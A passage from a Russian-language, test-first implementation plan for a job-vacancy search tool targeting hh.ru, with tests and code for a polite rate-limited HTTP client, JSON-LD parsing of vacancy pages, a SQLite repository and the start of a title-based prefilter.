    respx.get(URL).mock(return_value=httpx.Response(200, text="ok"))
    client, slept = make_client()
    with client:
        client.get(URL)
        client.get(URL)
    assert any(delay > 0 for delay in slept)


@respx.mock
def test_forbidden_aborts_without_retry() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(403))
    client, _ = make_client()
    with client, pytest.raises(AccessForbidden):
        client.get(URL)
    assert route.call_count == 1


@respx.mock
def test_retries_on_429_and_honours_retry_after() -> None:
    route = respx.get(URL).mock(
        side_effect=[
            httpx.Response(429, headers={"Retry-After": "7"}),
            httpx.Response(200, text="ok"),
        ]
    )
    client, slept = make_client()
    with client:
        response = client.get(URL)
    assert response.status_code == 200
    assert route.call_count == 2
    assert 7.0 in slept


@respx.mock
def test_gives_up_after_max_retries_on_server_error() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(503))
    client, _ = make_client(max_retries=2)
    with client, pytest.raises(FetchFailed):
        client.get(URL)
    assert route.call_count == 2


@respx.mock
def test_passes_conditional_headers_and_returns_304() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(304))
    client, _ = make_client()
    with client:
        response = client.get(URL, conditional={"If-None-Match": '"abc"'})
    assert response.status_code == 304
    assert route.calls.last.request.headers["If-None-Match"] == '"abc"'


@respx.mock
def test_respects_robots_disallow() -> None:
    respx.get(ROBOTS).mock(
        return_value=httpx.Response(200, text="User-agent: *\nDisallow: /search/\n")
    )
    client, _ = make_client(respect_robots=True)
    with client, pytest.raises(RobotsDisallowed):
        client.get(URL)
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_http.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.errors'`

- [ ] **Step 3: Реализовать `hh_search/errors.py`**

```python
class HhSearchError(Exception):
    """Базовая ошибка приложения."""


class AccessForbidden(HhSearchError):
    """Источник ответил 403. Прогон останавливается, обходить запрет нельзя."""


class FetchFailed(HhSearchError):
    """Не удалось получить ресурс после всех повторов."""


class RobotsDisallowed(HhSearchError):
    """robots.txt запрещает обращение к этому пути."""
```

- [ ] **Step 4: Реализовать `hh_search/sources/http.py`**

```python
import logging
import time
from collections.abc import Callable
from types import TracebackType
from urllib.parse import urlsplit
from urllib.robotparser import RobotFileParser

import httpx

from hh_search.config.models import HttpConfig
from hh_search.errors import AccessForbidden, FetchFailed, RobotsDisallowed

logger = logging.getLogger(__name__)

RETRYABLE_STATUSES = frozenset({429, 500, 502, 503, 504})


class PoliteClient:
    """HTTP-клиент, соблюдающий robots.txt, паузы между запросами и Retry-After."""

    def __init__(
        self,
        config: HttpConfig,
        user_agent: str,
        sleep: Callable[[float], None] = time.sleep,
        transport: httpx.BaseTransport | None = None,
    ) -> None:
        self._config = config
        self._user_agent = user_agent
        self._sleep = sleep
        self._client = httpx.Client(
            headers={"User-Agent": user_agent},
            timeout=config.timeout_sec,
            follow_redirects=True,
            transport=transport,
        )
        self._last_request_at: float | None = None
        self._robots: RobotFileParser | None = None

    def __enter__(self) -> "PoliteClient":
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc: BaseException | None,
        tb: TracebackType | None,
    ) -> None:
        self.close()

    def close(self) -> None:
        self._client.close()

    def get(self, url: str, conditional: dict[str, str] | None = None) -> httpx.Response:
        self._check_robots(url)
        last_error: Exception | None = None
        for attempt in range(self._config.max_retries):
            self._throttle()
            try:
                response = self._client.get(url, headers=conditional or {})
            except httpx.HTTPError as error:
                last_error = error
                self._backoff(attempt)
                continue

            if response.status_code == 403:
                raise AccessForbidden(
                    f"hh.ru ответил 403 на {url}. Возможно, источник закрыли. "
                    "Прогон остановлен, обходные пути не применяются."
                )
            if response.status_code not in RETRYABLE_STATUSES:
                return response

            last_error = FetchFailed(f"{response.status_code} на {url}")
            self._backoff(attempt, response.headers.get("Retry-After"))

        raise FetchFailed(f"не удалось получить {url}: {last_error}")

    def _throttle(self) -> None:
        if self._last_request_at is None:
            self._last_request_at = time.monotonic()
            return
        elapsed = time.monotonic() - self._last_request_at
        remaining = self._config.delay_between_requests_sec - elapsed
        if remaining > 0:
            self._sleep(remaining)
        self._last_request_at = time.monotonic()

    def _backoff(self, attempt: int, retry_after: str | None = None) -> None:
        if retry_after and retry_after.strip().isdigit():
            self._sleep(float(retry_after.strip()))
            return
        self._sleep(self._config.delay_between_requests_sec * (2**attempt))

    def _check_robots(self, url: str) -> None:
        if not self._config.respect_robots:
            return
        if self._robots is None:
            self._robots = self._load_robots(url)
        if not self._robots.can_fetch(self._user_agent, url):
            raise RobotsDisallowed(f"robots.txt запрещает {url}")

    def _load_robots(self, url: str) -> RobotFileParser:
        parts = urlsplit(url)
        parser = RobotFileParser()
        try:
            response = self._client.get(f"{parts.scheme}://{parts.netloc}/robots.txt")
            parser.parse(response.text.splitlines() if response.status_code == 200 else [])
        except httpx.HTTPError:
            logger.warning("robots.txt недоступен, считаем что ограничений нет")
            parser.parse([])
        return parser
```

- [ ] **Step 5: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_http.py -v && uv run mypy hh_search`
Expected: 7 passed

- [ ] **Step 6: Коммит**

```bash
git add hh_search/errors.py hh_search/sources/http.py tests/test_http.py
git commit -m "feat: вежливый HTTP-клиент

Соблюдение robots.txt, пауза между запросами, Retry-After и
экспоненциальный backoff. 403 не ретраится и роняет прогон —
обходить блокировку нельзя по требованиям спеки."
```

---

### Task 5: Извлечение JSON-LD со страницы вакансии

**Files:**
- Create: `hh_search/sources/vacancy_page.py`
- Create: `tests/fixtures/vacancy.html.gz`
- Test: `tests/test_vacancy_page.py`

**Interfaces:**
- Consumes: `VacancyDetails` из Task 3
- Produces: `extract_job_posting(html: str) -> dict[str, Any] | None`, `html_to_text(html: str) -> str`, `parse_vacancy_page(html: str) -> VacancyDetails` (бросает `FetchFailed`, если `JobPosting` не найден), `vacancy_url(vacancy_id: str) -> str`

- [ ] **Step 1: Сохранить фикстуру страницы вакансии**

Страница весит ~770 КБ, поэтому кладём её в репозиторий сжатой.

```bash
curl -s -H "User-Agent: hh-search/0.1 (fixture capture)" \
  "https://hh.ru/vacancy/135586311" | gzip -9 > tests/fixtures/vacancy.html.gz
python -c "
import gzip
html = gzip.open('tests/fixtures/vacancy.html.gz','rt',encoding='utf-8').read()
assert 'application/ld+json' in html and 'JobPosting' in html
print('ok', len(html), 'символов')
"
```

Если вакансия уже удалена, возьмите любой живой id из `tests/fixtures/rss_yocto.xml`.

- [ ] **Step 2: Написать падающий тест**

Создать `tests/test_vacancy_page.py`:

```python
import gzip
from pathlib import Path

import pytest

from hh_search.errors import FetchFailed
from hh_search.sources.vacancy_page import (
    extract_job_posting,
    html_to_text,
    parse_vacancy_page,
    vacancy_url,
)

FIXTURE = Path(__file__).parent / "fixtures" / "vacancy.html.gz"


def load_fixture() -> str:
    with gzip.open(FIXTURE, "rt", encoding="utf-8") as handle:
        return handle.read()


def test_extracts_job_posting_from_real_page() -> None:
    posting = extract_job_posting(load_fixture())
    assert posting is not None
    assert posting["@type"] == "JobPosting"
    assert posting["title"]
    assert posting["description"]


def test_parse_vacancy_page_returns_plain_text_description() -> None:
    details = parse_vacancy_page(load_fixture())
    assert details.description
    assert "<p>" not in details.description
    assert "&nbsp;" not in details.description


def test_parse_vacancy_page_raises_when_json_ld_is_missing() -> None:
    with pytest.raises(FetchFailed):
        parse_vacancy_page("<html><body>ничего полезного</body></html>")


def test_extract_job_posting_skips_other_ld_json_blocks() -> None:
    html = (
        '<script type="application/ld+json">{"@type": "Organization"}</script>'
        '<script type="application/ld+json">{"@type": "JobPosting", '
        '"title": "Инженер", "description": "<p>текст</p>"}</script>'
    )
    posting = extract_job_posting(html)
    assert posting is not None
    assert posting["title"] == "Инженер"


def test_extract_job_posting_tolerates_malformed_block() -> None:
    html = (
        '<script type="application/ld+json">{ битый json </script>'
        '<script type="application/ld+json">{"@type": "JobPosting", "description": "ок"}</script>'
    )
    posting = extract_job_posting(html)
    assert posting is not None
    assert posting["description"] == "ок"


def test_html_to_text_unescapes_and_keeps_line_breaks() -> None:
    text = html_to_text("<p>Задачи:</p><ul><li>C++&nbsp;&amp; Linux</li><li>Yocto</li></ul>")
    assert "C++ & Linux" in text
    assert "Yocto" in text
    assert "<" not in text


def test_vacancy_url_is_built_from_id() -> None:
    assert vacancy_url("135586311") == "https://hh.ru/vacancy/135586311"
```

- [ ] **Step 3: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_vacancy_page.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.sources.vacancy_page'`

- [ ] **Step 4: Реализовать `hh_search/sources/vacancy_page.py`**

```python
import json
import re
from datetime import datetime
from html import unescape
from typing import Any

from hh_search.domain.models import VacancyDetails
from hh_search.errors import FetchFailed

_LD_JSON_RE = re.compile(
    r'<script[^>]*type="application/ld\+json"[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE
)
_BLOCK_END_RE = re.compile(r"</(p|div|li|ul|ol|h[1-6])>|<br\s*/?>", re.IGNORECASE)
_TAG_RE = re.compile(r"<[^>]+>")
_SPACES_RE = re.compile(r"[ \t ]+")
_BLANK_LINES_RE = re.compile(r"\n{3,}")


def vacancy_url(vacancy_id: str) -> str:
    return f"https://hh.ru/vacancy/{vacancy_id}"


def extract_job_posting(html: str) -> dict[str, Any] | None:
    """Находит блок JSON-LD с типом JobPosting. Битые блоки пропускает."""
    for block in _LD_JSON_RE.findall(html):
        try:
            data = json.loads(block)
        except json.JSONDecodeError:
            continue
        if isinstance(data, dict) and data.get("@type") == "JobPosting":
            return data
    return None


def html_to_text(html: str) -> str:
    text = _BLOCK_END_RE.sub("\n", html)
    text = _TAG_RE.sub("", text)
    text = unescape(text)
    text = _SPACES_RE.sub(" ", text)
    text = "\n".join(line.strip() for line in text.splitlines())
    return _BLANK_LINES_RE.sub("\n\n", text).strip()


def _parse_datetime(value: Any) -> datetime | None:
    if not isinstance(value, str):
        return None
    try:
        return datetime.fromisoformat(value)
    except ValueError:
        return None


def _extract_locality(posting: dict[str, Any]) -> str | None:
    location = posting.get("jobLocation")
    if not isinstance(location, dict):
        return None
    address = location.get("address")
    if not isinstance(address, dict):
        return None
    locality = address.get("addressLocality")
    return locality if isinstance(locality, str) else None


def parse_vacancy_page(html: str) -> VacancyDetails:
    posting = extract_job_posting(html)
    if posting is None:
        raise FetchFailed("на странице нет блока JSON-LD с JobPosting")
    return VacancyDetails(
        description=html_to_text(str(posting.get("description", ""))),
        valid_through=_parse_datetime(posting.get("validThrough")),
        location=_extract_locality(posting),
    )
```

- [ ] **Step 5: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_vacancy_page.py -v && uv run mypy hh_search`
Expected: 7 passed

- [ ] **Step 6: Коммит**

```bash
git add hh_search/sources/vacancy_page.py tests/test_vacancy_page.py tests/fixtures
git commit -m "feat: извлечение JSON-LD со страницы вакансии

Берём структурированный JobPosting, а не вёрстку — устойчивее к
редизайну. Битые блоки ld+json пропускаются, отсутствие JobPosting
поднимает FetchFailed, что на уровне конвейера превращается в
повторную попытку. Фикстура живой страницы лежит сжатой."
```

---

### Task 6: Хранилище

**Files:**
- Create: `hh_search/storage/__init__.py`, `hh_search/storage/schema.sql`, `hh_search/storage/repository.py`
- Test: `tests/test_repository.py`

**Interfaces:**
- Consumes: `DiscoveredVacancy`, `VacancyDetails`, `ScoreBreakdown`, `ScoredVacancy` из Task 3
- Produces: `class SqliteRepository(path: Path | str)` с методами:
  - `init_schema() -> None`
  - `close() -> None`, поддержка контекстного менеджера
  - `known_ids(ids: Iterable[str]) -> set[str]`
  - `add_discovered(vacancy: DiscoveredVacancy, cluster: str, weight: int) -> bool` — возвращает `True`, если вакансия новая; при повторном обнаружении другим запросом только дописывает связь в `vacancy_query` и, если новый запрос весомее, переписывает кластер
  - `mark_rejected(vacancy_id: str, reason: str) -> None`
  - `pending_enrichment(max_attempts: int) -> list[DiscoveredVacancy]`
  - `save_details(vacancy_id: str, details: VacancyDetails) -> None`
  - `bump_enrich_attempt(vacancy_id: str) -> int` — возвращает новое значение счётчика
  - `save_score(vacancy_id: str, score: ScoreBreakdown) -> None`
  - `unreported() -> list[ScoredVacancy]`
  - `mark_reported(ids: Sequence[str]) -> None`
  - `set_status(vacancy_id: str, status: str) -> None`
  - `start_run() -> int`, `finish_run(run_id: int, status: str, finished_at: datetime | None = None, **counters: int | str | None) -> None` — `finished_at` по умолчанию «сейчас»; явное значение нужно тестам и делает поведение детерминированным
  - `last_successful_run() -> datetime | None`
  - `cache_headers(url: str) -> dict[str, str]`, `save_cache_headers(url: str, etag: str | None, last_modified: str | None) -> None`

> **Отклонение от спеки, зафиксировать:** в §5.1 нет таблицы `http_cache`, но §3.5 требует условных запросов. Таблица добавлена здесь; спека будет обновлена в Task 13.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_repository.py`:

```python
from datetime import datetime

import pytest

from hh_search.domain.models import DiscoveredVacancy, Salary, ScoreBreakdown, VacancyDetails
from hh_search.storage.repository import SqliteRepository


@pytest.fixture()
def repo() -> SqliteRepository:
    repository = SqliteRepository(":memory:")
    repository.init_schema()
    return repository


def make_vacancy(vacancy_id: str = "1", query: str = "Yocto") -> DiscoveredVacancy:
    return DiscoveredVacancy(
        id=vacancy_id,
        url=f"https://hh.ru/vacancy/{vacancy_id}",
        title="Embedded Linux Engineer",
        company="ООО Ромашка",
        area="Нижний Новгород",
        salary=Salary(raw="от 200 000 руб.", amount_from=200000, currency="руб."),
        published_at=datetime(2026, 7, 27, 9, 0, 0),
        found_by_query=query,
    )


def make_score(total: float = 87.4) -> ScoreBreakdown:
    return ScoreBreakdown(
        title=1.0,
        stack=0.8,
        responsibilities=0.67,
        domain=1.0,
        penalty=0.0,
        total=total,
        matched={"stack": ["Yocto"]},
    )


def test_add_discovered_reports_new_only_once(repo: SqliteRepository) -> None:
    assert repo.add_discovered(make_vacancy(), "embedded", 9) is True
    assert repo.add_discovered(make_vacancy(), "embedded", 9) is False


def test_known_ids_returns_only_stored(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy("1"), "embedded", 9)
    assert repo.known_ids(["1", "2"]) == {"1"}


def test_heavier_query_wins_the_cluster(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy("1", "Yocto"), "embedded", 5)
    repo.add_discovered(make_vacancy("1", "Backend Team Lead"), "backend", 10)
    repo.save_details("1", VacancyDetails(description="текст"))
    repo.save_score("1", make_score())
    assert repo.unreported()[0].cluster == "backend"


def test_rejected_vacancy_is_not_offered_for_enrichment(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    repo.mark_rejected("1", "stop-word in title")
    assert repo.pending_enrichment(max_attempts=3) == []


def test_pending_enrichment_skips_exhausted_attempts(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    for _ in range(3):
        repo.bump_enrich_attempt("1")
    assert repo.pending_enrichment(max_attempts=3) == []


def test_enriched_and_scored_vacancy_becomes_unreported(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    repo.save_details("1", VacancyDetails(description="Требуется Yocto"))
    repo.save_score("1", make_score())
    pending = repo.unreported()
    assert len(pending) == 1
    assert pending[0].score.total == 87.4
    assert pending[0].discovered.salary.amount_from == 200000


def test_mark_reported_empties_the_queue(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    repo.save_details("1", VacancyDetails(description="текст"))
    repo.save_score("1", make_score())
    repo.mark_reported(["1"])
    assert repo.unreported() == []


def test_run_journal_tracks_last_success(repo: SqliteRepository) -> None:
    assert repo.last_successful_run() is None
    run_id = repo.start_run()
    repo.finish_run(run_id, "ok", discovered=20, new_count=2)
    assert isinstance(repo.last_successful_run(), datetime)


def test_failed_run_does_not_count_as_success(repo: SqliteRepository) -> None:
    run_id = repo.start_run()
    repo.finish_run(run_id, "failed", error="403")
    assert repo.last_successful_run() is None


def test_cache_headers_round_trip(repo: SqliteRepository) -> None:
    assert repo.cache_headers("https://hh.ru/x") == {}
    repo.save_cache_headers("https://hh.ru/x", etag='"abc"', last_modified=None)
    assert repo.cache_headers("https://hh.ru/x") == {"If-None-Match": '"abc"'}
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_repository.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.storage'`

- [ ] **Step 3: Создать `hh_search/storage/schema.sql`**

```sql
CREATE TABLE IF NOT EXISTS vacancy (
    id              TEXT PRIMARY KEY,
    url             TEXT NOT NULL,
    title           TEXT NOT NULL,
    company         TEXT,
    area            TEXT,
    salary_raw      TEXT,
    salary_from     INTEGER,
    salary_to       INTEGER,
    salary_currency TEXT,
    published_at    TEXT NOT NULL,
    description     TEXT,
    fetched_at      TEXT,
    enrich_attempts INTEGER NOT NULL DEFAULT 0,
    score           REAL,
    score_detail    TEXT,
    cluster         TEXT,
    cluster_weight  INTEGER NOT NULL DEFAULT 0,
    status          TEXT NOT NULL,
    reject_reason   TEXT,
    first_seen_at   TEXT NOT NULL,
    reported_at     TEXT
);

CREATE INDEX IF NOT EXISTS idx_vacancy_status ON vacancy(status);

CREATE TABLE IF NOT EXISTS vacancy_query (
    vacancy_id TEXT NOT NULL REFERENCES vacancy(id),
    query      TEXT NOT NULL,
    PRIMARY KEY (vacancy_id, query)
);

CREATE TABLE IF NOT EXISTS run (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    started_at  TEXT NOT NULL,
    finished_at TEXT,
    status      TEXT NOT NULL,
    discovered  INTEGER DEFAULT 0,
    new_count   INTEGER DEFAULT 0,
    rejected    INTEGER DEFAULT 0,
    enriched    INTEGER DEFAULT 0,
    reported    INTEGER DEFAULT 0,
    error       TEXT
);

CREATE TABLE IF NOT EXISTS http_cache (
    url           TEXT PRIMARY KEY,
    etag          TEXT,
    last_modified TEXT,
    fetched_at    TEXT NOT NULL
);
```

- [ ] **Step 4: Реализовать `hh_search/storage/repository.py`**

```python
import json
import sqlite3
from collections.abc import Iterable, Sequence
from datetime import UTC, datetime
from pathlib import Path
from types import TracebackType

from hh_search.domain.models import (
    DiscoveredVacancy,
    Salary,
    ScoreBreakdown,
    ScoredVacancy,
    VacancyDetails,
)

SCHEMA_PATH = Path(__file__).parent / "schema.sql"

STATUS_NEW = "new"
STATUS_REJECTED = "rejected"
STATUS_REPORTED = "reported"


def _now() -> str:
    return datetime.now(UTC).isoformat()


class SqliteRepository:
    """Единственное место в проекте, где живёт SQL."""

    def __init__(self, path: Path | str) -> None:
        self._connection = sqlite3.connect(str(path))
        self._connection.row_factory = sqlite3.Row
        self._connection.execute("PRAGMA foreign_keys = ON")

    def __enter__(self) -> "SqliteRepository":
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc: BaseException | None,
        tb: TracebackType | None,
    ) -> None:
        self.close()

    def close(self) -> None:
        self._connection.close()

    def init_schema(self) -> None:
        self._connection.executescript(SCHEMA_PATH.read_text(encoding="utf-8"))
        self._connection.commit()

    # --- discovery -----------------------------------------------------

    def known_ids(self, ids: Iterable[str]) -> set[str]:
        wanted = list(ids)
        if not wanted:
            return set()
        placeholders = ",".join("?" * len(wanted))
        rows = self._connection.execute(
            f"SELECT id FROM vacancy WHERE id IN ({placeholders})", wanted
        )
        return {row["id"] for row in rows}

    def add_discovered(self, vacancy: DiscoveredVacancy, cluster: str, weight: int) -> bool:
        cursor = self._connection.execute(
            """
            INSERT INTO vacancy (id, url, title, company, area, salary_raw, salary_from,
                                 salary_to, salary_currency, published_at, status,
                                 cluster, cluster_weight, first_seen_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(id) DO NOTHING
            """,
            (
                vacancy.id,
                vacancy.url,
                vacancy.title,
                vacancy.company,
                vacancy.area,
                vacancy.salary.raw,
                vacancy.salary.amount_from,
                vacancy.salary.amount_to,
                vacancy.salary.currency,
                vacancy.published_at.isoformat(),
                STATUS_NEW,
                cluster,
                weight,
                _now(),
            ),
        )
        is_new = cursor.rowcount > 0
        self._connection.execute(
            "INSERT OR IGNORE INTO vacancy_query (vacancy_id, query) VALUES (?, ?)",
            (vacancy.id, vacancy.found_by_query),
        )
        if not is_new:
            self._connection.execute(
                "UPDATE vacancy SET cluster = ?, cluster_weight = ? "
                "WHERE id = ? AND cluster_weight < ?",
                (cluster, weight, vacancy.id, weight),
            )
        self._connection.commit()
        return is_new

    def mark_rejected(self, vacancy_id: str, reason: str) -> None:
        self._connection.execute(
            "UPDATE vacancy SET status = ?, reject_reason = ? WHERE id = ?",
            (STATUS_REJECTED, reason, vacancy_id),
        )
        self._connection.commit()

    def set_status(self, vacancy_id: str, status: str) -> None:
        self._connection.execute(
            "UPDATE vacancy SET status = ? WHERE id = ?", (status, vacancy_id)
        )
        self._connection.commit()

    # --- enrichment ----------------------------------------------------

    def pending_enrichment(self, max_attempts: int) -> list[DiscoveredVacancy]:
        rows = self._connection.execute(
            """
            SELECT v.*, (SELECT query FROM vacancy_query q WHERE q.vacancy_id = v.id LIMIT 1)
                   AS found_by_query
            FROM vacancy v
            WHERE v.status = ? AND v.description IS NULL AND v.enrich_attempts < ?
            ORDER BY v.published_at DESC
            """,
            (STATUS_NEW, max_attempts),
        ).fetchall()
        return [self._to_discovered(row) for row in rows]

    def save_details(self, vacancy_id: str, details: VacancyDetails) -> None:
        self._connection.execute(
            "UPDATE vacancy SET description = ?, fetched_at = ? WHERE id = ?",
            (details.description, _now(), vacancy_id),
        )
        self._connection.commit()

    def bump_enrich_attempt(self, vacancy_id: str) -> int:
        self._connection.execute(
            "UPDATE vacancy SET enrich_attempts = enrich_attempts + 1 WHERE id = ?", (vacancy_id,)
        )
        self._connection.commit()
        row = self._connection.execute(
            "SELECT enrich_attempts FROM vacancy WHERE id = ?", (vacancy_id,)
        ).fetchone()
        return int(row["enrich_attempts"]) if row else 0

    # --- scoring and reporting -----------------------------------------

    def save_score(self, vacancy_id: str, score: ScoreBreakdown) -> None:
        self._connection.execute(
            "UPDATE vacancy SET score = ?, score_detail = ? WHERE id = ?",
            (score.total, score.model_dump_json(), vacancy_id),
        )
        self._connection.commit()

    def unreported(self) -> list[ScoredVacancy]:
        rows = self._connection.execute(
            """
            SELECT v.*, (SELECT query FROM vacancy_query q WHERE q.vacancy_id = v.id LIMIT 1)
                   AS found_by_query
            FROM vacancy v
            WHERE v.status = ? AND v.score IS NOT NULL AND v.description IS NOT NULL
            ORDER BY v.score DESC
            """,
            (STATUS_NEW,),
        ).fetchall()
        return [
            ScoredVacancy(
                discovered=self._to_discovered(row),
                details=VacancyDetails(description=row["description"]),
                score=ScoreBreakdown.model_validate(json.loads(row["score_detail"])),
                cluster=row["cluster"] or "",
            )
            for row in rows
        ]

    def mark_reported(self, ids: Sequence[str]) -> None:
        if not ids:
            return
        self._connection.executemany(
            "UPDATE vacancy SET status = ?, reported_at = ? WHERE id = ?",
            [(STATUS_REPORTED, _now(), vacancy_id) for vacancy_id in ids],
        )
        self._connection.commit()

    # --- run journal ---------------------------------------------------

    def start_run(self) -> int:
        cursor = self._connection.execute(
            "INSERT INTO run (started_at, status) VALUES (?, 'running')", (_now(),)
        )
        self._connection.commit()
        return int(cursor.lastrowid or 0)

    def finish_run(
        self,
        run_id: int,
        status: str,
        finished_at: datetime | None = None,
        **counters: int | str | None,
    ) -> None:
        allowed = {"discovered", "new_count", "rejected", "enriched", "reported", "error"}
        fields = {name: value for name, value in counters.items() if name in allowed}
        assignments = ", ".join(f"{name} = ?" for name in fields)
        prefix = f"{assignments}, " if assignments else ""
        moment = (finished_at or datetime.now(UTC)).isoformat()
        self._connection.execute(
            f"UPDATE run SET {prefix}status = ?, finished_at = ? WHERE id = ?",
            (*fields.values(), status, moment, run_id),
        )
        self._connection.commit()

    def last_successful_run(self) -> datetime | None:
        row = self._connection.execute(
            "SELECT finished_at FROM run WHERE status IN ('ok', 'partial') "
            "AND finished_at IS NOT NULL ORDER BY finished_at DESC LIMIT 1"
        ).fetchone()
        return datetime.fromisoformat(row["finished_at"]) if row else None

    # --- conditional requests ------------------------------------------

    def cache_headers(self, url: str) -> dict[str, str]:
        row = self._connection.execute(
            "SELECT etag, last_modified FROM http_cache WHERE url = ?", (url,)
        ).fetchone()
        if row is None:
            return {}
        headers: dict[str, str] = {}
        if row["etag"]:
            headers["If-None-Match"] = row["etag"]
        if row["last_modified"]:
            headers["If-Modified-Since"] = row["last_modified"]
        return headers

    def save_cache_headers(self, url: str, etag: str | None, last_modified: str | None) -> None:
        if etag is None and last_modified is None:
            return
        self._connection.execute(
            "INSERT INTO http_cache (url, etag, last_modified, fetched_at) VALUES (?, ?, ?, ?) "
            "ON CONFLICT(url) DO UPDATE SET etag = excluded.etag, "
            "last_modified = excluded.last_modified, fetched_at = excluded.fetched_at",
            (url, etag, last_modified, _now()),
        )
        self._connection.commit()

    # --- helpers -------------------------------------------------------

    @staticmethod
    def _to_discovered(row: sqlite3.Row) -> DiscoveredVacancy:
        return DiscoveredVacancy(
            id=row["id"],
            url=row["url"],
            title=row["title"],
            company=row["company"],
            area=row["area"],
            salary=Salary(
                raw=row["salary_raw"],
                amount_from=row["salary_from"],
                amount_to=row["salary_to"],
                currency=row["salary_currency"],
            ),
            published_at=datetime.fromisoformat(row["published_at"]),
            found_by_query=row["found_by_query"] or "",
        )
```

Создать пустой `hh_search/storage/__init__.py`. Убедиться, что `schema.sql` попадает в пакет: добавить в `pyproject.toml` секцию

```toml
[tool.hatch.build.targets.wheel.force-include]
"hh_search/storage/schema.sql" = "hh_search/storage/schema.sql"
```

- [ ] **Step 5: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_repository.py -v && uv run mypy hh_search`
Expected: 10 passed

- [ ] **Step 6: Коммит**

```bash
git add hh_search/storage tests/test_repository.py pyproject.toml
git commit -m "feat: хранилище на SQLite

Весь SQL собран в одном модуле — это точка расширения под Postgres.
Кластер вакансии определяется самым весомым запросом, которым она
найдена. Добавлена таблица http_cache для условных запросов из §3.5
спеки, которой не было в §5.1."
```

---

### Task 7: Префильтр

**Files:**
- Create: `hh_search/filtering/prefilter.py`
- Test: `tests/test_prefilter.py`

**Interfaces:**
- Consumes: `SignalMatcher` из Task 2, `DiscoveredVacancy` из Task 3, `ProfileConfig` из Task 1
- Produces: `class Prefilter(profile: ProfileConfig)` с методом `reason_to_reject(vacancy: DiscoveredVacancy) -> str | None` (возвращает причину отказа или `None`, если вакансия проходит дальше)

**Что изменил переезд источника.** Discovery идёт по листингу `/vacancies/{slug}`, а он
отдаёт только id, url и заголовок (спека §3.2). Обещание прежней редакции — «префильтр по
заголовку **и региону**» — больше невыполнимо: региона, компании и зарплаты на этом шаге
физически нет, они приезжают со страницы вакансии, то есть уже после того, как за неё
заплачено запросом. Задача отсеивает по заголовку и только по нему.

**Что здесь дорого.** Ложный отказ — это `status='rejected'` навсегда: вакансия не
вернётся ни следующим прогоном, ни после правки конфига. Пропущенный мусор стоит одного
запроса к hh.ru. Асимметрия и определяет набор тестов: главный из них — на живой фикстуре
листинга, и он проверяет **список выживших целиком**, а не число отказов.

Пустой стоп-сигнал (`SignalMatcher([""])` совпадает почти с любым текстом, а отказ
необратим и с пустой причиной в логе) **уже закрыт** коммитом `e588f4d` — и валидатором
конфига (`Signal` в `config/models.py`), и самим `_compile`. Задача 7 на это опирается и
ничего не изобретает заново; тест остаётся как страховка на самое дорогое.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_prefilter.py`:

```python
import gzip
from pathlib import Path

import pytest
from pydantic import ValidationError

from hh_search.config.models import ProfileConfig, Saturation, Signals, Weights
from hh_search.domain.models import DiscoveredVacancy
from hh_search.filtering.matching import SignalMatcher
from hh_search.filtering.prefilter import Prefilter
from hh_search.sources.listing import parse_listing

FIXTURES = Path(__file__).parent / "fixtures"
LIVE_LISTING = "listing_programmist.html.gz"

# Стоп-слова образца profile.yaml из спеки §7 — ровно те, что поедут в прод.
SPEC_NEGATIVE = [
    "junior",
    "стажёр",
    "intern",
    "1c",
    "продаж",
    "рекрутер",
    "ручн тестиров",
    "оператор пк",
    "оператор call",
    "оператор колл",
    "оператор станка",
    "курьер",
]


def make_profile(negative: list[str]) -> ProfileConfig:
    """Профиль, в котором заполнено только то, что читает префильтр.

    Позитивные сигналы намеренно пусты: на шаге 3 они не участвуют вовсе,
    и пустые списки это фиксируют лучше любого комментария.
    """
    return ProfileConfig(
        weights=Weights(title=0.4, stack=0.3, responsibilities=0.2, domain=0.1),
        saturation=Saturation(stack=5, responsibilities=3),
        penalty_per_signal=15,
        signals=Signals(
            title_roles=[],
            title_tech=[],
            stack=[],
            responsibilities=[],
            domain=[],
        ),
        negative=negative,
    )


def make_vacancy(title: str, company: str | None = None) -> DiscoveredVacancy:
    """Ровно то, что даёт листинг: id, url, title (спека §3.2)."""
    return DiscoveredVacancy(
        id="1",
        url="https://hh.ru/vacancy/1",
        title=title,
        company=company,
        found_by_query="programmist",
    )


def load(name: str) -> str:
    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
        return handle.read()


def test_clean_title_passes() -> None:
    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
    assert prefilter.reason_to_reject(make_vacancy("Backend Team Lead")) is None


def test_reason_names_the_stop_word_that_decided() -> None:
    """Причина уходит в `reject_reason` и остаётся единственным следом
    решения: без названного слова отладку списка сигналов не провести."""
    reason = Prefilter(make_profile(SPEC_NEGATIVE)).reason_to_reject(
        make_vacancy("Junior Python Developer")
    )
    assert reason == "стоп-слово в заголовке: junior"


def test_reason_lists_every_matched_stop_word_in_config_order() -> None:
